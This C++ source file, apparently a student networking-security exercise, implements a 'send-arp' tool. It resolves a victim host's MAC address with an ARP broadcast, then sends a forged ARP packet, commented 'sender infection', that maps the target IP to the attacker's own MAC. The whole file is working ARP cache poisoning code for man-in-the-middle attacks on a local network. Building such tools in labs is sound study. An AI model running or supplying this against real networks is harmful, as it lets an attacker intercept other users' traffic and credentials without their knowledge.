#include <stdio.h>
#include <stdlib.h>
#include "header.h"
Etharp sendpacket(WMac dmac, WMac smac, WMac tmac,WIp tip, WIp sip){
    Etharp etharp;
    etharp.eth.dmac_ = dmac;
    etharp.eth.smac_ = smac;
    etharp.eth.type_ = htons(WEthHdr::Arp);

    etharp.arp.hrd_ = htons(WArpHdr::ETHER);
    etharp.arp.pro_ = htons(WEthHdr::Ip4);
    etharp.arp.hln_ = WMac::SIZE;
    etharp.arp.pln_ = WIp::SIZE;
    etharp.arp.op_ = htons(WArpHdr::Request);
    etharp.arp.smac_ = smac;
    etharp.arp.sip_ = htonl(sip);
    etharp.arp.tmac_ = tmac;
    etharp.arp.tip_ = htonl(tip);
    return etharp;
}
int main(int argc, char* argv[]){

    if((argc-3)%2!=0){
        printf("syntax : send-arp <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
        printf("sample : send-arp 192.168.10.2 192.168.10.1\n");
        exit(1);
    }

    int cnt = (argc-1)/2;
    vector <flow> vector;
    for(int i = 0;i < cnt; i++){

        struct flow flow;
        flow.sip_ = WIp(argv[2*i+1]);
        flow.tip_ = WIp(argv[2*i+2]);
        vector.push_back(flow);

        WNetInfo& wnetinfo = WNetInfo::instance();
        WRtm& rtm = wnetinfo.rtm();
        WRtmEntry* rtmentry = rtm.getBestEntry(flow.tip_);

        WPcapDevice device;
        device.intfName_ = rtmentry->intf()->name();
        device.open();//can find mymac, myip

        //find sender's mac
        Etharp etharp = sendpacket(WMac("FF:FF:FF:FF:FF:FF"),device.intf()->mac(),WMac("00:00:00:00:00:00"),flow.sip_,device.intf()->ip());

        WPacket packet = WPacket();
        packet.buf_.data_ = reinterpret_cast<byte*>(&etharp);
        packet.buf_.size_ = sizeof(Etharp);
        device.write(packet.buf_);

        Etharp* etharp_r;
        while(1){//sender's mac acquire
            if(device.WPcapCapture::read(&packet)==WPacket::Result::Ok){
                etharp_r = (Etharp*)packet.buf_.data_;
                if(etharp_r->eth.type()!=WEthHdr::Arp)continue;
                if(etharp_r->eth.dmac_==device.intf()->mac()&&etharp_r->arp.sip()==flow.sip_){
                    flow.smac_ = etharp_r->eth.smac();
                    break;
                }
            }
        }

        //sender infection
        etharp = sendpacket(flow.smac_,device.intf()->mac(),flow.smac_,flow.sip_,flow.tip_);
        packet.buf_.data_ = reinterpret_cast<byte*>(&etharp);
        packet.buf_.size_ = sizeof(Etharp);
        device.write(packet.buf_);

    }
    return 0;
}
